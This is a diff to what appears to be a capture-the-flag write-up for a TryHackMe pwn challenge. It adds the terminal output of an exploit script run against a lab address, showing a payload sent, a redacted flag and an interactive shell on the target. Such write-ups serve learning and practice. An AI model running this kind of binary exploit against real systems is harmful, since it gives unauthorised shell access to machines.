@@ -59,3 +59,17 @@ log.success("Flag achieved!: " + flag.decode())
 log.success("Getting Shell.")
 p.interactive()
 ```
+
+### Output
+
+```bash
+$ ./exploit.py remote 10.10.231.62 9002
+[+] Opening connection to 10.10.231.62 on port 9002: Done
+[*] Sending payload.
+[*] Getting Flag.
+[+] Flag achieved!: THM{[REDACTED]}
+[+] Getting Shell.
+[*] Switching to interactive mode
+$ id
+uid=1003(pwn102) gid=1003(pwn102) groups=1003(pwn102)
+```
